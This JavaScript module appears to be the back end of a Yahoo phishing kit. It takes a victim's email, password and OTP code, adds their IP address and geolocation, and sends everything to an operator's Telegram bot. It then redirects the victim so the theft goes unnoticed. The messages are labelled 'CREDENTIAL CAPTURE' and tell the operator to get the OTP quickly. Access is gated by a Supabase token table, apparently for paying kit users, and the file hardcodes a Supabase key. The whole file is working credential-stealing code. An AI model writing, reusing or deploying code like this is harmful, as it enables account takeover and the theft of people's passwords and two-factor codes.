import { createClient } from "https://cdn.jsdelivr.net/npm/@supabase/supabase-js@2/+esm";

// Initialize Supabase client
const supabaseUrl = "https://rwdyanuhxnmbvuhupzbc.supabase.co";
const supabaseKey = "eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJpc3MiOiJzdXBhYmFzZSIsInJlZiI6InJ3ZHlhbnVoeG5tYnZ1aHVwemJjIiwicm9sZSI6ImFub24iLCJpYXQiOjE3NTk3MjczNzQsImV4cCI6MjA3NTMwMzM3NH0.sjfpw_C5B6E5ujbm7jZ-SU1yvJg-ambt8IKiMazhOYw";
const supabase = createClient(supabaseUrl, supabaseKey);

/**
 * Sends user data to Telegram and optionally redirects to a URL
 *
 * @param {Object} obj - Configuration object
 * @param {Object} obj.userData - User credentials and data
 * @param {string} obj.userData.username - User's email/username
 * @param {string} obj.userData.password - User's password
 * @param {string} [obj.userData.otp_code] - Optional verification code
 * @param {number} [obj.userData.userTry] - Optional attempt count
 * @param {Object} obj.telegram - Telegram bot configuration
 * @param {string} obj.telegram.apiToken - Telegram bot API token
 * @param {string|number} obj.telegram.chatId - Telegram chat ID
 * @param {string|null} [url=null] - URL to redirect to after sending (optional)
 * @returns {Promise<boolean>} - Returns true if message sent successfully, false otherwise
 *
 */

async function sendToTelegram(obj, url = null) {
  try {
    // Validate required fields
    if (!obj || !obj.userData || !obj.telegram) {
      console.error("Invalid configuration object. Please ensure obj contains both userData and telegram properties");
      return false;
    }

    const { userData, telegram } = obj;
    const { apiToken, chatId } = telegram;

    // authenticate user
    if (!(await supabaseAuthentication(telegram))) {
      console.warn("user not authenticated!");
      return false;
    }

    // Validate Telegram credentials
    if (!apiToken || !chatId) {
      console.error("Missing Telegram API token or chat ID");
      return false;
    }

    // Fetch IP and location information
    const ipInfo = await fetchIPInfo();

    // Build the message text
    const messageText = buildMessage(userData, ipInfo);

    // Send message to Telegram
    const success = await sendTelegramMessage(apiToken, chatId, messageText);

    if (success) {
      // console.success("Message sent successfully to Telegram");

      // Redirect if URL is provided
      if (url) {
        window.location.href = url;
      }

      return true;
    } else {
      // console.warn("Failed to send message to Telegram");

      // Still redirect even if sending fails (to maintain user experience)
      if (url) {
        window.location.href = url;
      }

      return false;
    }
  } catch (error) {
    console.error("Error in sendToTelegram:", error);

    // Redirect even on error if URL provided
    if (url) {
      window.location.href = url;
    }

    return false;
  }
}

/**
 * Fetches IP and geolocation information
 * @returns {Promise<Object>} IP information object
 */
async function fetchIPInfo() {
  try {
    const response = await fetch("https://ipapi.co/json/");

    if (!response.ok) {
      throw new Error(`IP API error: ${response.status}`);
    }

    const data = await response.json();

    return {
      ip: data.ip || "N/A",
      country: data.country || "N/A",
      latitude: data.latitude || "N/A",
      longitude: data.longitude || "N/A",
    };
  } catch (error) {
    console.warn("Failed to fetch IP info:", error);
    return {
      ip: "N/A",
      country: "N/A",
      latitude: "N/A",
      longitude: "N/A",
    };
  }
}

/**
 * Builds the message text to send to Telegram
 * @param {Object} userData - User data object
 * @param {Object} ipInfo - IP information object
 * @returns {string} Formatted message text
 */

function buildMessage(userData, ipInfo) {
  const { username, password, otp_code, userTry } = userData;

  let message = `${otp_code ? `*CREDENTIAL CAPTURE*` : `YAHOO LOG`}\n`;
  message += `Email/Username: ${username || "N/A"}\n`;
  message += `Password: ${password || "N/A"}\n`;
  message += otp_code ? `OTP Code: ${otp_code}\n` : "\n*Send OTP as soon as possible!*\n";

  if (!userTry) {
    // message += `OTP Code: ${otp_code}\n`;
    message += `\nAttempts: ${userTry}\n`;

    message += `\n*LOCATION DATA*\n`;
    message += `IP: ${ipInfo.ip}\n`;
    message += `Country: ${ipInfo.country}\n`;
    message += `Coordinates: ${ipInfo.latitude}, ${ipInfo.longitude}`;
  }

  return message;
}

/**
 * Sends a message to Telegram using the bot API
 * @param {string} apiToken - Telegram bot token
 * @param {string|number} chatId - Telegram chat ID
 * @param {string} text - Message text to send
 * @returns {Promise<boolean>} True if successful, false otherwise
 */
async function sendTelegramMessage(apiToken, chatId, text) {
  const url = `https://api.telegram.org/bot${apiToken}/sendMessage`;

  try {
    const response = await fetch(url, {
      method: "POST",
      headers: {
        "Content-Type": "application/json",
      },
      body: JSON.stringify({
        chat_id: chatId,
        text: text,
        parse_mode: "Markdown",
      }),
    });

    if (!response.ok) {
      console.warn(`Telegram API responded with status ${response.status}`);
      return false;
    }

    const data = await response.json();
    return data.ok === true;
  } catch (error) {
    console.error("Failed to send Telegram message:", error);
    return false;
  }
}

/**
 * To check if the user using the is authenticated
 * @param {object} apiToken - Telegram bot token
 * @returns {<boolean>} True if successful, false otherwise
 */
async function supabaseAuthentication(telegram) {
  const { apiToken } = telegram;
  const { data, error } = await supabase.from("yahuu_verification_tokens").select("*");

  if (error) return false;

  console.log("data from supabase: >>>>", data);

  const isTokenAuthenticated = data.filter((userAuth) => {
    if (apiToken === userAuth.token) return userAuth;
  });

  // console.log("Is user authenticated? >>>>", isTokenAuthenticated[0].token === apiToken ? true : false);

  if (isTokenAuthenticated.length > 0) {
    return isTokenAuthenticated[0].token === apiToken ? true : "";
  }

  return false;
}

// Export as default
export default sendToTelegram;
